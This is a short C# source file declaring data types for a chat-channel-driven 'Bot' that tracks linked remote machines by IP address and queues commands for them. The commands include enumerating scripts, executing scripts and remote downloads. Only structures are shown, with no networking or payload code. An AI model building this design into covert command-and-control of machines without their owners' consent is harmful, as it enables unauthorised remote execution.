using System;
using System.Collections.Concurrent;
using System.Net;

namespace Link_Master.Worker
{
    internal static partial class Bot
    {
        private static readonly ConcurrentDictionary<UInt64, Machine> ActiveMachineLinks = new();

        private readonly struct Machine
        {
            internal Machine(ref UInt64 channelID, IPAddress iPAddress)
            {
                ChannelID = channelID;
                Address = iPAddress;

                CommandQueue = new();
                ResultsQueue = new();
            }

            internal readonly UInt64 ChannelID;
            internal readonly IPAddress Address;

            internal readonly ConcurrentQueue<Command> CommandQueue;
            internal readonly Object CommandQueue_Lock = new();

            internal readonly ConcurrentQueue<Result> ResultsQueue;
            internal readonly Object ResultsQueue_Lock = new();
        }

        private struct Result
        {
            internal Result(Byte id, Byte[] result)
            {
                ID = id;
                ResultData = result;
            }

            internal readonly Byte ID;
            internal Byte[] ResultData;
        }

        private readonly struct Command
        {
            internal Command(Byte id, CommandAction action, Byte[] data)
            {
                ID = id;
                CommandAction = action;
                Data = data;
            }

            internal readonly Byte ID;
            internal readonly CommandAction CommandAction;
            internal readonly Byte[] Data;
        }

        private enum CommandAction
        {
            UAliveQuestionMark = 0x01,
            YuesAmIAlive = 0x02,

            EnumScripts = 0x03,
            ExecuteScript = 0x04,
            RemoteDownload = 0x05
        }
    }
}
